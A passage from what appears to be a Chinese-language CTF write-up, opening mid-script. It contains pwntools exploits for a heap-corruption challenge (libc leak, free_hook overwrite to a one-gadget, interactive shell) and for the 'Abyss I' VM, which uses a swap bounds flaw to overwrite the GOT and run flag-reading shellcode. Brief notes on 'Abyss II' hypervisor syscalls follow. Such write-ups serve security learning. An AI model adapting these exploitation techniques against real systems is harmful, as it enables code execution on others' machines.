        cd('A'*0x30)
        touch('B'*0x30)
        cd('..')
        rm('A'*0x30)
        touch('X')
        touch('C'*0x30)
        rm('X')
        ls('')
        p.recv(0x14)
        heap = u64(p.recv(6).ljust(8,'\x00'))
        print hex(heap)
        heap_base = heap - 76864
        print hex(heap_base)
        rm(p64(heap))
        # raw_input()
        ls(p64(heap_base+0x11fd0)[:-2])
        # raw_input()
        for i in range(4):
            ls('HEHE')
        # raw_input()
        ls('A'*8+p16(0x561))
        rm('/etc/passwd')
        ls('/')
        ls('/')
        ls('/')
        p.recvuntil('dev')
        p.recv(0x10)
        libc = u64(p.recv(6).ljust(8,'\x00'))
        print hex(libc)
        libc_base = libc - 0x789ca0
        print hex(libc_base)
        # raw_input()
        for i in range(2):
            ls('D'*0x30)
        # raw_input()
        rm('/dev')
    # add bin sh
        # ls('')
        mv('HEHE','sh')
        # mv('/bin/id','/bin/sh')
        # cd('../../../../../../../../../../../bin')
        for i in range(9):
            ls('D'*0x60)
        # ls('E'*0x40)
        # ls('E'*0x40)
        rm('/boot')
        ls('E'*0x40)
        # raw_input('hehehe')
        free_hook = 7911656 + libc_base
        malloc_hook = 0x789c30 + libc_base
        magic = 0x4f440 + libc_base + 3792896
        ls('X'*0x40+p64(heap_base+0x50-0x28))
        ls('D'*0x30)
        # raw_input('sending free hook')
        # ls(p64(free_hook-0x28)[:-2])
        # raw_input()
        print hex(magic)
        print hex(free_hook)
        rm('A'*0x28+p64(free_hook))
        # mkdir('../../../../../../../../../../../../../../bin/sh')
        # mv('/bin/id',p64(magic))
        ls(p64(magic))
        p.recvrepeat(1)
        # raw_input()
        p.sendline('rm ' + '../'*8+'home/groot/sh')
        # raw_input()
        # ls('123')
        # mkdir('ttt')
        # cd('ttt')
        # for i in range(10):
        #     mkdir(str(i)*0x30)
        # mkdir('C'*0x30)
        # cd('C'*0x30)
        # touch('A'*0x30)
        # cd('..')
        # rm('C'*0x30)
        # touch()
        p.interactive()
    if __name__ == '__main__':
        exp("id")
### Abyss I
是个堆栈机VM  
swap 没有边界检查，可以越界到machine
把machine盖成负数，可以向上写got表  
输入中放入shellcode，改shellcode跳过去即可
    from pwn import *
    p = remote('35.200.23.198', 31733)
    context(arch = 'amd64', os = 'linux')
    context.aslr = False
    #p = process('./user.elf')
    #gdb.attach(p)
    #p = process('./hypervisor.elf kernel.bin ld.so.2 ./user.elf'.split(' '))
    payload = '4294967295\\'
    payload += '%' * ((0x2020a0 - 0x202030) / 4 - 2)
    payload += '0:'
    payload += '1:'
    payload += '%%%%1;'
    payload += str(0x2030A4 + 0x100 - 0x7b6) + '+'
    # payload += str(0x7BEC0 - 0x4f322) + '\x011'
    # payload += ';-'
    # payload += '0;'
    # payload += '.'
    payload += '0;'
    payload += ','
    payload = payload.ljust(0x100, '\x01')
    payload += asm(shellcraft.amd64.linux.open('flag', 0, 0))
    payload += asm(shellcraft.amd64.linux.read(3, 'rsp', 0x100))
    payload += asm(shellcraft.amd64.linux.write(1, 'rsp', 0x100))
    p.sendline(payload)
    p.interactive()
### Abyss II
系统调用号对应的处理函数(大概)
    (0, '0x239L') read
    (1, '0xa9aL') write
    (2, '0x972L') open
    (3, '0xf4bL') 
    (5, '0x1caL')
    (9, '0xc47L')
    (10, '0x17b2L')
    (11, '0xd54L')
    (12, '0xbc6L')
    (20, '0xb0dL')
    (21, '0xa4cL')
    (60, '0x966L')
    (158, '0xb87L')
    (221, '0x195L')
    (231, '0x966L')
    (257, '0xa39L')
write_sys 应该可以溢出。。。。试一试  
让buf的地址加上size溢出到一个很小的数应该就可以过那个检查  
kmalloc很大的数的时候会返回0，看了一下hypervisor似乎image base也是0，大概可以覆盖代码
hypervisor还有个蜜汁验证
已经能成功执行shellcode了，还需要逆一下串口的交互，手写一下open，read和write
    from pwn import *
    import time